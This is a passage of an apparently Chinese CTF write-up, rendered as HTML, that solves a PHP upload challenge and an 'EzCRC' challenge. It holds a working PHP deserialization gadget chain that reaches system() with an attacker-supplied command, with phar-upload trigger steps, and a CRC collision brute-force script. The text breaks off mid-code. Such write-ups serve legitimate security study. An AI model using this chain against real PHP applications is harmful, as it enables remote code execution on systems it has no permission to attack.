class="title">hover</span>:<span class="title">bg</span>-<span class="title">blue</span>-600 <span class="title">text</span>-<span class="title">white</span> <span class="title">font</span>-<span class="title">semibold</span> <span class="title">py</span>-2 <span class="title">px</span>-4 <span class="title">rounded</span>-<span class="title">lg</span> <span class="title">transition</span> <span class="title">duration</span>-300 <span class="title">ease</span>-<span class="title">in</span>-<span class="title">out</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                    上传</span></span><br><span class="line"><span class="class">                &lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;?<span class="title">php</span> <span class="title">if</span> (!<span class="title">empty</span>($<span class="title">output</span>)): ?&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">mt</span>-6 <span class="title">p</span>-4 <span class="title">bg</span>-<span class="title">gray</span>-50 <span class="title">border</span> <span class="title">border</span>-<span class="title">gray</span>-200 <span class="title">rounded</span>-<span class="title">lg</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">h3</span> <span class="title">class</span>=&quot;<span class="title">text</span>-<span class="title">lg</span> <span class="title">font</span>-<span class="title">semibold</span> <span class="title">mb</span>-2 <span class="title">text</span>-<span class="title">gray</span>-800&quot;&gt;上传结果:&lt;/<span class="title">h3</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">output</span>; ?&gt;</span></span><br><span class="line"><span class="class">                &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;?<span class="title">php</span> <span class="title">endif</span>; ?&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">p</span> <span class="title">class</span>=&quot;<span class="title">mt</span>-6 <span class="title">text</span>-<span class="title">center</span> <span class="title">text</span>-<span class="title">sm</span> <span class="title">text</span>-<span class="title">gray</span>-500&quot;&gt;</span></span><br><span class="line"><span class="class">                只允许上传 .<span class="title">txt</span>, .<span class="title">png</span>, .<span class="title">gif</span>, .<span class="title">jpg</span> 文件。</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;?<span class="title">php</span> <span class="title">endif</span>; ?&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">html</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>本以为是打phar反序列化，但是<code>$file_object = @unserialize($filename_param);</code>这里直接对file_to_check参数反序列化了，感觉预期应该是打phar的，可能参数没处理好</p>
+<h3 id="exp——直接打反序列化"><a href="#exp——直接打反序列化" class="headerlink" title="exp——直接打反序列化"></a>exp——直接打反序列化</h3><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ApplicationContext</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$contextName</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileManager</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$targetFile</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$responseData</span> = <span class="string">&#x27;default_response&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;method&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">method_exists</span>(<span class="variable">$this</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;method&#x27;</span>])) &#123;</span><br><span class="line">            <span class="variable">$method</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;method&#x27;</span>];</span><br><span class="line">            <span class="variable">$var</span> = <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;var&#x27;</span>]) ? <span class="variable">$_POST</span>[<span class="string">&#x27;var&#x27;</span>] : <span class="literal">null</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="variable">$method</span>(<span class="variable">$var</span>);   <span class="comment">// performWriteOperation(&#x27;new FunctionInvoker()&#x27;)</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;responseData;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">performWriteOperation</span>(<span class="params"><span class="variable">$var</span></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$targetObject</span> = <span class="variable language_">$this</span>-&gt;targetFile;   <span class="comment">//$this-&gt;targetFile = new ContentProcessor();</span></span><br><span class="line">        <span class="variable">$value</span> = <span class="variable">$targetObject</span>-&gt;<span class="variable">$var</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ContentProcessor</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$processedContent</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$callbackFunction</span> = <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;processedContent = <span class="keyword">new</span> <span class="title class_">FunctionInvoker</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">property_exists</span>(<span class="variable">$this</span>, <span class="variable">$key</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">is_object</span>(<span class="variable">$this</span>-&gt;<span class="variable">$key</span>) &amp;&amp; <span class="title function_ invoke__">is_string</span>(<span class="variable">$this</span>-&gt;callbackFunction)) &#123;</span><br><span class="line"></span><br><span class="line">                <span class="variable language_">$this</span>-&gt;<span class="variable">$key</span>-&gt;&#123;<span class="variable language_">$this</span>-&gt;callbackFunction&#125;(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);  <span class="comment">//cmd=whoami</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FunctionInvoker</span></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">ApplicationContext</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;contextName = <span class="keyword">new</span> <span class="title class_">FileManager</span>(); <span class="comment">//POST method=performWriteOperation&amp;var=processedContent</span></span><br><span class="line"><span class="variable">$a</span>-&gt;contextName-&gt;targetFile = <span class="keyword">new</span> <span class="title class_">ContentProcessor</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/image-20250824121910353.png"
+                      alt="image-20250824121910353"
+                ></p>
+<h3 id="phar反序列化"><a href="#phar反序列化" class="headerlink" title="phar反序列化"></a>phar反序列化</h3><p>将上面的exp写入phar，然后重命名为.txt上传文件</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/image-20250824122812174.png"
+                      alt="image-20250824122812174"
+                ></p>
+<p>phar协议触发反序列化</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/image-20250824123730964.png"
+                      alt="image-20250824123730964"
+                ></p>
+<h2 id="EzCRC"><a href="#EzCRC" class="headerlink" title="EzCRC"></a>EzCRC</h2><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 从原始代码复制的CRC计算函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">compute_crc16</span>(<span class="params"><span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$checksum</span> = <span class="number">0xFFFF</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$data</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$checksum</span> ^= <span class="title function_ invoke__">ord</span>(<span class="variable">$data</span>[<span class="variable">$i</span>]);</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$j</span> = <span class="number">0</span>; <span class="variable">$j</span> &lt; <span class="number">8</span>; <span class="variable">$j</span>++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$checksum</span> &amp; <span class="number">1</span>) &#123;</span><br><span class="line">                <span class="variable">$checksum</span> = ((<span class="variable">$checksum</span> &gt;&gt; <span class="number">1</span>) ^ <span class="number">0xA001</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$checksum</span> &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$checksum</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">calculate_crc8</span>(<span class="params"><span class="variable">$input</span></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">static</span> <span class="variable">$crc8_table</span> = [</span><br><span class="line">        <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x0E</span>, <span class="number">0x09</span>, <span class="number">0x1C</span>, <span class="number">0x1B</span>, <span class="number">0x12</span>, <span class="number">0x15</span>,</span><br><span class="line">        <span class="number">0x38</span>, <span class="number">0x3F</span>, <span class="number">0x36</span>, <span class="number">0x31</span>, <span class="number">0x24</span>, <span class="number">0x23</span>, <span class="number">0x2A</span>, <span class="number">0x2D</span>,</span><br><span class="line">        <span class="number">0x70</span>, <span class="number">0x77</span>, <span class="number">0x7E</span>, <span class="number">0x79</span>, <span class="number">0x6C</span>, <span class="number">0x6B</span>, <span class="number">0x62</span>, <span class="number">0x65</span>,</span><br><span class="line">        <span class="number">0x48</span>, <span class="number">0x4F</span>, <span class="number">0x46</span>, <span class="number">0x41</span>, <span class="number">0x54</span>, <span class="number">0x53</span>, <span class="number">0x5A</span>, <span class="number">0x5D</span>,</span><br><span class="line">        <span class="number">0xE0</span>, <span class="number">0xE7</span>, <span class="number">0xEE</span>, <span class="number">0xE9</span>, <span class="number">0xFC</span>, <span class="number">0xFB</span>, <span class="number">0xF2</span>, <span class="number">0xF5</span>,</span><br><span class="line">        <span class="number">0xD8</span>, <span class="number">0xDF</span>, <span class="number">0xD6</span>, <span class="number">0xD1</span>, <span class="number">0xC4</span>, <span class="number">0xC3</span>, <span class="number">0xCA</span>, <span class="number">0xCD</span>,</span><br><span class="line">        <span class="number">0x90</span>, <span class="number">0x97</span>, <span class="number">0x9E</span>, <span class="number">0x99</span>, <span class="number">0x8C</span>, <span class="number">0x8B</span>, <span class="number">0x82</span>, <span class="number">0x85</span>,</span><br><span class="line">        <span class="number">0xA8</span>, <span class="number">0xAF</span>, <span class="number">0xA6</span>, <span class="number">0xA1</span>, <span class="number">0xB4</span>, <span class="number">0xB3</span>, <span class="number">0xBA</span>, <span class="number">0xBD</span>,</span><br><span class="line">        <span class="number">0xC7</span>, <span class="number">0xC0</span>, <span class="number">0xC9</span>, <span class="number">0xCE</span>, <span class="number">0xDB</span>, <span class="number">0xDC</span>, <span class="number">0xD5</span>, <span class="number">0xD2</span>,</span><br><span class="line">        <span class="number">0xFF</span>, <span class="number">0xF8</span>, <span class="number">0xF1</span>, <span class="number">0xF6</span>, <span class="number">0xE3</span>, <span class="number">0xE4</span>, <span class="number">0xED</span>, <span class="number">0xEA</span>,</span><br><span class="line">        <span class="number">0xB7</span>, <span class="number">0xB0</span>, <span class="number">0xB9</span>, <span class="number">0xBE</span>, <span class="number">0xAB</span>, <span class="number">0xAC</span>, <span class="number">0xA5</span>, <span class="number">0xA2</span>,</span><br><span class="line">        <span class="number">0x8F</span>, <span class="number">0x88</span>, <span class="number">0x81</span>, <span class="number">0x86</span>, <span class="number">0x93</span>, <span class="number">0x94</span>, <span class="number">0x9D</span>, <span class="number">0x9A</span>,</span><br><span class="line">        <span class="number">0x27</span>, <span class="number">0x20</span>, <span class="number">0x29</span>, <span class="number">0x2E</span>, <span class="number">0x3B</span>, <span class="number">0x3C</span>, <span class="number">0x35</span>, <span class="number">0x32</span>,</span><br><span class="line">        <span class="number">0x1F</span>, <span class="number">0x18</span>, <span class="number">0x11</span>, <span class="number">0x16</span>, <span class="number">0x03</span>, <span class="number">0x04</span>, <span class="number">0x0D</span>, <span class="number">0x0A</span>,</span><br><span class="line">        <span class="number">0x57</span>, <span class="number">0x50</span>, <span class="number">0x59</span>, <span class="number">0x5E</span>, <span class="number">0x4B</span>, <span class="number">0x4C</span>, <span class="number">0x45</span>, <span class="number">0x42</span>,</span><br><span class="line">        <span class="number">0x6F</span>, <span class="number">0x68</span>, <span class="number">0x61</span>, <span class="number">0x66</span>, <span class="number">0x73</span>, <span class="number">0x74</span>, <span class="number">0x7D</span>, <span class="number">0x7A</span>,</span><br><span class="line">        <span class="number">0x89</span>, <span class="number">0x8E</span>, <span class="number">0x87</span>, <span class="number">0x80</span>, <span class="number">0x95</span>, <span class="number">0x92</span>, <span class="number">0x9B</span>, <span class="number">0x9C</span>,</span><br><span class="line">        <span class="number">0xB1</span>, <span class="number">0xB6</span>, <span class="number">0xBF</span>, <span class="number">0xB8</span>, <span class="number">0xAD</span>, <span class="number">0xAA</span>, <span class="number">0xA3</span>, <span class="number">0xA4</span>,</span><br><span class="line">        <span class="number">0xF9</span>, <span class="number">0xFE</span>, <span class="number">0xF7</span>, <span class="number">0xF0</span>, <span class="number">0xE5</span>, <span class="number">0xE2</span>, <span class="number">0xEB</span>, <span class="number">0xEC</span>,</span><br><span class="line">        <span class="number">0xC1</span>, <span class="number">0xC6</span>, <span class="number">0xCF</span>, <span class="number">0xC8</span>, <span class="number">0xDD</span>, <span class="number">0xDA</span>, <span class="number">0xD3</span>, <span class="number">0xD4</span>,</span><br><span class="line">        <span class="number">0x69</span>, <span class="number">0x6E</span>, <span class="number">0x67</span>, <span class="number">0x60</span>, <span class="number">0x75</span>, <span class="number">0x72</span>, <span class="number">0x7B</span>, <span class="number">0x7C</span>,</span><br><span class="line">        <span class="number">0x51</span>, <span class="number">0x56</span>, <span class="number">0x5F</span>, <span class="number">0x58</span>, <span class="number">0x4D</span>, <span class="number">0x4A</span>, <span class="number">0x43</span>, <span class="number">0x44</span>,</span><br><span class="line">        <span class="number">0x19</span>, <span class="number">0x1E</span>, <span class="number">0x17</span>, <span class="number">0x10</span>, <span class="number">0x05</span>, <span class="number">0x02</span>, <span class="number">0x0B</span>, <span class="number">0x0C</span>,</span><br><span class="line">        <span class="number">0x21</span>, <span class="number">0x26</span>, <span class="number">0x2F</span>, <span class="number">0x28</span>, <span class="number">0x3D</span>, <span class="number">0x3A</span>, <span class="number">0x33</span>, <span class="number">0x34</span>,</span><br><span class="line">        <span class="number">0x4E</span>, <span class="number">0x49</span>, <span class="number">0x40</span>, <span class="number">0x47</span>, <span class="number">0x52</span>, <span class="number">0x55</span>, <span class="number">0x5C</span>, <span class="number">0x5B</span>,</span><br><span class="line">        <span class="number">0x76</span>, <span class="number">0x71</span>, <span class="number">0x78</span>, <span class="number">0x7F</span>, <span class="number">0x6A</span>, <span class="number">0x6D</span>, <span class="number">0x64</span>, <span class="number">0x63</span>,</span><br><span class="line">        <span class="number">0x3E</span>, <span class="number">0x39</span>, <span class="number">0x30</span>, <span class="number">0x37</span>, <span class="number">0x22</span>, <span class="number">0x25</span>, <span class="number">0x2C</span>, <span class="number">0x2B</span>,</span><br><span class="line">        <span class="number">0x06</span>, <span class="number">0x01</span>, <span class="number">0x08</span>, <span class="number">0x0F</span>, <span class="number">0x1A</span>, <span class="number">0x1D</span>, <span class="number">0x14</span>, <span class="number">0x13</span>,</span><br><span class="line">        <span class="number">0xAE</span>, <span class="number">0xA9</span>, <span class="number">0xA0</span>, <span class="number">0xA7</span>, <span class="number">0xB2</span>, <span class="number">0xB5</span>, <span class="number">0xBC</span>, <span class="number">0xBB</span>,</span><br><span class="line">        <span class="number">0x96</span>, <span class="number">0x91</span>, <span class="number">0x98</span>, <span class="number">0x9F</span>, <span class="number">0x8A</span>, <span class="number">0x8D</span>, <span class="number">0x84</span>, <span class="number">0x83</span>,</span><br><span class="line">        <span class="number">0xDE</span>, <span class="number">0xD9</span>, <span class="number">0xD0</span>, <span class="number">0xD7</span>, <span class="number">0xC2</span>, <span class="number">0xC5</span>, <span class="number">0xCC</span>, <span class="number">0xCB</span>,</span><br><span class="line">        <span class="number">0xE6</span>, <span class="number">0xE1</span>, <span class="number">0xE8</span>, <span class="number">0xEF</span>, <span class="number">0xFA</span>, <span class="number">0xFD</span>, <span class="number">0xF4</span>, <span class="number">0xF3</span></span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$bytes</span> = <span class="title function_ invoke__">unpack</span>(<span class="string">&#x27;C*&#x27;</span>, <span class="variable">$input</span>);</span><br><span class="line">    <span class="variable">$length</span> = <span class="title function_ invoke__">count</span>(<span class="variable">$bytes</span>);</span><br><span class="line">    <span class="variable">$crc</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$k</span> = <span class="number">1</span>; <span class="variable">$k</span> &lt;= <span class="variable">$length</span>; <span class="variable">$k</span>++) &#123;</span><br><span class="line">        <span class="variable">$crc</span> = <span class="variable">$crc8_table</span>[(<span class="variable">$crc</span> ^ <span class="variable">$bytes</span>[<span class="variable">$k</span>]) &amp; <span class="number">0xff</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$crc</span> &amp; <span class="number">0xff</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 目标密码和长度</span></span><br><span class="line"><span class="variable">$SECRET_PASS</span> = <span class="string">&quot;Enj0yNSSCTF4th!&quot;</span>;</span><br><span class="line"><span class="variable">$passLength</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$SECRET_PASS</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 计算目标校验值</span></span><br><span class="line"><span class="variable">$target_crc16</span> = <span class="title function_ invoke__">compute_crc16</span>(<span class="variable">$SECRET_PASS</span>);</span><br><span class="line"><span class="variable">$target_crc8</span> = <span class="title function_ invoke__">calculate_crc8</span>(<span class="variable">$SECRET_PASS</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;目标密码: <span class="subst">$SECRET_PASS</span>\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;目标CRC16: &quot;</span> . <span class="title function_ invoke__">dechex</span>(<span class="variable">$target_crc16</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;目标CRC8: &quot;</span> . <span class="title function_ invoke__">dechex</span>(<span class="variable">$target_crc8</span>) . <span class="string">&quot;\n\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 阶段1: 修改单个字节 (高效搜索)</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;阶段1: 尝试修改单个字节...\n&quot;</span>;</span><br><span class="line"><span class="variable">$found</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$attempts</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$pos</span> = <span class="number">0</span>; <span class="variable">$pos</span> &lt; <span class="variable">$passLength</span>; <span class="variable">$pos</span>++) &#123;</span><br><span class="line">    <span class="variable">$base</span> = <span class="variable">$SECRET_PASS</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$char</span> = <span class="number">0</span>; <span class="variable">$char</span> &lt; <span class="number">256</span>; <span class="variable">$char</span>++) &#123;</span><br><span class="line">        <span class="variable">$attempts</span>++;</span><br><span class="line">        <span class="variable">$candidate</span> = <span class="title function_ invoke__">substr_replace</span>(<span class="variable">$base</span>, <span class="title function_ invoke__">chr</span>(<span class="variable">$char</span>), <span class="variable">$pos</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 跳过原始密码</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$candidate</span> === <span class="variable">$SECRET_PASS</span>) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 计算CRC16并检查</span></span><br><span class="line">        <span class="variable">$crc16</span> = <span class="title function_ invoke__">compute_crc16</span>(<span class="variable">$candidate</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$crc16</span> !== <span class="variable">$target_crc16</span>) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 计算CRC8并检查</span></span><br><span class="line">        <span class="variable">$crc8</span> = <span class="title function_ invoke__">calculate_crc8</span>(<span class="variable">$candidate</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$crc8</span> === <span class="variable">$target_crc8</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;\n发现碰撞密码: &quot;</span> . <span class="title function_ invoke__">bin2hex</span>(<span class="variable">$candidate</span>) . <span class="string">&quot; (原始: <span class="subst">$candidate</span>)\n&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;经过 <span class="subst">$attempts</span> 次尝试\n&quot;</span>;</span><br><span class="line">            <span class="variable">$found</span> = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">break</span> <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 阶段2: 修改两个字节 (中等范围搜索)</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$found</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;\n阶段1未找到碰撞，进入阶段2...\n&quot;</span>;</span><br><span class="line">    <span class="variable">$positions</span> = <span class="title function_ invoke__">range</span>(<span class="number">0</span>, <span class="variable">$passLength</span> - <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$positions</span> <span class="keyword">as</span> <span class="variable">$i</span>) &#123;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$positions</span> <span class="keyword">as</span> <span class="variable">$j</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$i</span> &gt;= <span class="variable">$j</span>) <span class="keyword">continue</span>; <span class="comment">// 避免重复组合</span></span><br><span class="line"></span><br><span class="line">            <span class="variable">$base</span> = <span 